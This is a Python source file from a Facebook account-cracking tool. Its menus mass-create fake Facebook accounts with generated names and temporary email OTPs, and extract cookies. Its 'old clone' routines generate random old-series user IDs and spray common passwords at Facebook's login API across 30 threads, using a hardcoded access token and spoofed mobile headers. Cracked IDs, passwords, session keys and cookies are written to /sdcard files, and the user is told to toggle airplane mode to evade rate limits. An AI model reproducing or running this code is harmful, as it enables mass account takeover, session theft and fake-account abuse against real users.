    def wait_for_otp(self, timeout: int = 120) -> str | None:
        print("Waiting for OTP....")
        start = time.time()
        while time.time() - start < timeout:
            message = self.fetch_email()
            if message:
                body = str(message.get("body") or message.get("text") or "")
                otp = self.extract_otp(body)
                if otp:
                    print("OTP FOUND")
                    return otp
            time.sleep(5)
        print("OTP timeout.")
        return None

def auto_create_fb_menu():
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    while True:
        print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mAuto Create FB (BD Method)      \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mAuto Create FB (PH Method)      \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37mAuto Create FB (US Method)      \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[4] \033[1;33m---> \033[1;37mJust 2FA                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[5] \033[1;33m---> \033[1;37mGet Mail OTP                    \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[6] \033[1;33m---> \033[1;37mCookies Extract                 \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[7] \033[1;33m---> \033[1;37mSet Default Password            \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
        
        if choice in ("1", "2", "3"):
            try:
                count = int(input("HOW MANY ACCOUNTS: ").strip())
            except ValueError:
                print("Please enter a valid number")
                time.sleep(1)
                continue
            password = get_default_password() or set_default_password()
            if not password:
                continue
            
            method_func = createfb_method_1 if choice == "1" else (createfb_method_2 if choice == "2" else createfb_method_3)
            region = "BD" if choice == "1" else ("PH" if choice == "2" else "US")
            
            for i in range(1, count + 1):
                email = xiyadmailx_email()
                if region == "BD":
                    first = get_bd_name()
                    last = random.choice(BD_SURNAMES)
                    phone = get_bd_phone()
                elif region == "PH":
                    first = get_ph_name()
                    last = random.choice(PH_SURNAMES)
                    phone = ""
                else:
                    first = get_us_name()
                    last = random.choice(US_SURNAMES)
                    phone = ""
                
                print(f"[{i}/{count}] [{region}] Creating -> {email}")
                result = method_func(email=email, password=password, first_name=first, last_name=last, phone=phone)
                if result.get("error"):
                    print(f" [!] Error: {result['error']}")
                else:
                    status = result.get("status_code", "Unknown")
                    print(f" [✓] Status: {status} | Account Processing Completed")
                    save_to_file(AUTO_CREATE_FILE, json.dumps(result, ensure_ascii=False))
            input("\nPress Enter to continue...")
        elif choice == "4":
            code = just_2fa()
            if code:
                print("2FA Code:", code)
            else:
                print("No 2FA key found.")
            input("\nPress Enter to continue...")
        elif choice == "5":
            tool = TempMail()
            email = tool.create_email()
            if email:
                print("Email:", email)
                tool.wait_for_otp()
            input("\nPress Enter to continue...")
        elif choice == "6":
            path_str = input("Enter file path: ").strip()
            print(coki_ext(path_str))
            input("\nPress Enter to continue...")
        elif choice == "7":
            set_default_password()
            input("\nPress Enter to continue...")
        elif choice in ("0", "00"):
            break
        else:
            print("Invalid option!")
            time.sleep(1)

def file_cloning_old_fb():
    auto_create_fb_menu()

def old_clone():
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mALL SERIES                      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37m100003/4 SERIES                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37m2009 SERIES                     \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    _input = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    if _input in ('1', '01'):
        old_One()
    elif _input in ('2', '02'):
        old_Tow()
    elif _input in ('3', '03'):
        old_Tree()
    elif _input in ('0', '00'):
        return
    else:
        print(f"{padding}\033[1;31m [!] OPTION NOT FOUND IN MENU...")
        time.sleep(1)
        old_clone()

def old_One():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] OLD CODE : 2010-2014\033[0m")
    ask = input(f"{padding}\033[1;32m [–] SELECT : \033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] SELECT : \033[0m")
    linex()
    star = '10000'
    for _ in range(int(limit) if limit.isdigit() else 20000):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for mal in user:
            uid = star + mal
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('0', '00'):
                old_clone()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def old_Tow():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] OLD CODE : 2010-2014\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit) if limit.isdigit() else 20000):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD A                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD B                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;31m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('0', '00'):
                old_clone()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def old_Tree():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] OLD CODE : 2009-2010\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefix = '1000004'
    for _ in range(int(limit) if limit.isdigit() else 20000):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD A                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD B                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MODE EVERY 5 MINUTES\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('0', '00'):
                old_clone()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window761(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            try:
                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=15).json()
            except:
                continue

            if 'session_key' in res:
                session_key = res.get("session_key", "")
                cookies = res.get("session_cookies", [])
                cookie_str = ";".join([f"{c.get('name')}={c.get('value')}" for c in cookies]) if isinstance(cookies, list) else ""
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{session_key}|{cookie_str}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                session_key = res.get("session_key", "")
                print(f"\r\r\x1b[1;37m(\x1b[1;37mRAJA VAU\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{session_key}\n")
                oks.append(uid)
                break
        loop += 1
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA OK ID-M1\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
    except Exception:
        loop += 1

def login_2(uid):
    global loop
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window761(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers, timeout=15).json()
                if 'session_key' in str(po):
                    session_key = po.get("session_key", "")
                    cookies = po.get("session_cookies", [])
                    cookie_str = ";".join([f"{c.get('name')}={c.get('value')}" for c in cookies]) if isinstance(cookies, list) else ""
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{session_key}|{cookie_str}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
    loop += 1
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA -M2\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    sys.stdout.flush()

if __name__ == '__main__':
    approval_system()
    old_clone()
